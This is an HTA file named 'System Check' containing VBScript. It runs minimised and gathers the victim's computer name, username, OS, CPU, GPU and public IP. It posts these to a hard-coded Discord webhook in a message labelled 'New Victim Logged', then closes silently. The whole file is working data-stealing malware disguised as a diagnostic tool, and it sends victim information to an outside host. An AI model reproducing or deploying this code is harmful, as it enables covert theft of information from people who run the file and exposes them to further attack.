<!DOCTYPE html>
<html>
<head>
    <title>System Check</title>
    <HTA:APPLICATION ID="oSc" APPLICATIONNAME="SystemCheck" WINDOWSTATE="minimize" />
</head>
<body>
    <script language="VBScript">
        Dim http, shell, fso, computer, user, os, cpu, ip, gpu
        Set shell = CreateObject("WScript.Shell")
        Set fso = CreateObject("Scripting.FileSystemObject")
        Set http = CreateObject("MSXML2.XMLHTTP")

        ' System info
        computer = shell.ExpandEnvironmentStrings("%COMPUTERNAME%")
        user = shell.ExpandEnvironmentStrings("%USERNAME%")
        os = shell.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName")
        cpu = shell.RegRead("HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0\ProcessorNameString")

        ' GPU (try/catch since it might fail)
        On Error Resume Next
        gpu = shell.RegRead("HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000\DriverDesc")
        If gpu = "" Then gpu = "N/A"
        On Error GoTo 0

        ' Public IP
        Set http2 = CreateObject("MSXML2.XMLHTTP")
        http2.open "GET", "https://api.ipify.org", False
        http2.send
        ip = http2.responseText

        ' Build Discord message
        Dim msg
        msg = "@everyone" & vbCrLf & _
              "**🎯 New Victim Logged**" & vbCrLf & _
              "━━━━━━━━━━━━━━━━━━━" & vbCrLf & _
              "💻 **PC:** " & computer & vbCrLf & _
              "👤 **User:** " & user & vbCrLf & _
              "🖥️ **OS:** " & os & vbCrLf & _
              "⚡ **CPU:** " & cpu & vbCrLf & _
              "🎮 **GPU:** " & gpu & vbCrLf & _
              "🌐 **IP:** " & ip & vbCrLf & _
              "━━━━━━━━━━━━━━━━━━━" & vbCrLf & _
              "**Time:** " & Now() & vbCrLf & _
              "**🔗 Exploit Executed Successfully**"

        ' Send to Discord
        Dim payload
        payload = "{""content"": """ & Replace(msg, """", "\""") & """}"
        http.open "POST", "https://discordapp.com/api/webhooks/1525574348684001300/nBU6Bh2iAeoiL22dcmf83btWkpg3dSsBbvig9Kmfe6m3N4gvptKnQv0oqzlSivhkFTqV", False
        http.setRequestHeader "Content-Type", "application/json"
        http.send payload

        ' Close silently
        window.close()
    </script>
</body>
</html>
